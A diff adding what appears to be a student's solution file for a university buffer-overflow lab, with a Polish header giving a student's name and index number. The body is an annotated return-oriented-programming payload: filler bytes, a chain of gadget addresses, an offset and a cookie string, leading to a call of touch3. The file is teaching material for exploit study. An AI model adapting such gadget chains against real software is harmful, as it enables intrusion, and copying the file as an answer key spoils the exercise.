@@ -1,0 +1,27 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Jakub Kowalski, 323419
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* Filler */
+00 00 00 00 00 00 00 00 /* Po wyjściu z procedury getbuf %rsp będzie wskazywał na pozycję 2 linijki niżej */
+d5 1d 40 00 00 00 00 00 /* Adres gadżetu z procedury setval_386 (48 89 e0 c0 => movq %rsp, %rax; retq) */
+99 1d 40 00 00 00 00 00 /* Adres gadżetu z procedury getval_342 (48 89 c7 c3 => movq %rax, %rdi; retq) */
+96 1d 40 00 00 00 00 00 /* Adres gadżetu z procedury addval_449 (58 c3 => popq %rax; retq) */
+48 00 00 00 00 00 00 00 /* Liczba 72 w systemie szesnastkowym zdjęta ze stosu przez instrukcję powyżej; Dodając ją do %rsp (po wyjściu z procedury getbuf) otrzymamy adres, w którym znajdzie się nasze ciastko */
+3e 1e 40 00 00 00 00 00 /* Adres gadżetu z procedury setval_169 (89 c1 84 c9 c3 => movq %eax, %ecx; testb %cl, %cl; retq) */
+24 1e 40 00 00 00 00 00 /* Adres gadżetu z procedury getval_395 (89 ca 20 db c3 => movq %ecx, %edx; andb %bl, %bl; retq) */
+ee 1d 40 00 00 00 00 00 /* Adres gadżetu z procedury addval_493 (89 d6 20 db c3 => movq %edx, %esi; andb %bl, %bl; retq) */
+c6 1d 40 00 00 00 00 00 /* Adres procedury/gadżetu add_xy (lea (%rdi,%rsi,1),%rax; retq) */
+99 1d 40 00 00 00 00 00 /* Adres gadżetu z procedury getval_342 (48 89 c7 c3 => movq %rax, %rdi; retq) */
+f6 1c 40 00 00 00 00 00 /* Adres procedury touch3 */
+31 36 38 33 38 38 36 36 /* Ciastko w formie ASCII w systemie szesnastkowym */
